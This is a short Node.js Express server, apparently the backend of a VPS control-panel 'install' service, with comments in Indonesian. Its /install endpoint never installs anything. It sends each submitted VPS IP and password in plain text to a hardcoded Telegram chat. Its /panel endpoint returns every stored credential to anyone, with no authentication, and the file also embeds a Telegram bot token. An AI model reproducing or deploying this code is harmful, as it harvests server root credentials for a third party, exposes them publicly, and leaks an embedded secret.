const express = require("express");
const cors = require("cors");
const { Telegraf } = require("telegraf");

const app = express();
app.use(express.json());
app.use(cors());

const botToken = "7915792315:AAE3pKJqJ30c61miTM4yCo1cSpA1Gy5GMGM"; // Ganti dengan token bot Telegram
const chatId = "7081489041"; // Ganti dengan ID owner

const bot = new Telegraf(botToken);

// Simpan data panel (bisa pakai database, tapi di sini pakai array sementara)
let panelData = [];

app.post("/install", async (req, res) => {
  const { ipVPS, password } = req.body;
  
  if (!ipVPS || !password) {
    return res.status(400).json({ error: "IP VPS dan Password harus diisi!" });
  }

  // Kirim notifikasi ke owner di Telegram
  const message = `🚀 *New VPS Install Request*\n\n🔹 *IP VPS:* ${ipVPS}\n🔹 *Password:* ${password}`;
  await bot.telegram.sendMessage(chatId, message, { parse_mode: "Markdown" });

  // Simpan data ke array (bisa diganti database)
  const panelURL = `http://${ipVPS}:8080`;
  panelData.push({ ipVPS, password, panelURL, status: "Aktif" });

  res.json({ success: true, message: "Data VPS berhasil dikirim ke owner!", panelURL });
});

app.get("/panel", (req, res) => {
  res.json(panelData);
});

module.exports = app;
